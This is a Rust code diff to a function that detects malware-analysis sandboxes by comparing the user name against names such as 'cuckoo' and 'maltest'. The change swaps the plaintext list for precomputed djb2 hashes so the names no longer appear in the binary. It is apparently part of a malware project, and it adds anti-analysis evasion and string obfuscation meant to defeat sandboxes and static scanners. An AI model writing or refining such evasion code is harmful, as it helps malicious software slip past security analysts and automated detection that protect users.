@@ -60,11 +60,17 @@ unsafe fn username_is_sandbox() -> bool {
             if *ptr.add(i) != c { m = false; break; }
         }
         if m {
+            use crate::resolve::api_hash::djb2_hash;
             let mut lower = Vec::<u8>::new();
             let mut p = ptr.add(prefix.len());
             while *p != 0 { lower.push((*p as u8).to_ascii_lowercase()); p = p.add(1); }
-            const BAD: &[&[u8]] = &[b"sandbox", b"maltest", b"virus", b"cuckoo", b"john", b"test"];
-            return BAD.iter().any(|&n| lower == n);
+            // Compare against precomputed hashes — no plaintext sandbox names in binary.
+            const BAD_H: &[u32] = &[
+                djb2_hash(b"sandbox"), djb2_hash(b"maltest"), djb2_hash(b"virus"),
+                djb2_hash(b"cuckoo"),  djb2_hash(b"john"),    djb2_hash(b"test"),
+            ];
+            let user_h = djb2_hash(&lower);
+            return BAD_H.iter().any(|&h| user_h == h);
         }
         while *ptr != 0 { ptr = ptr.add(1); }
         ptr = ptr.add(1);
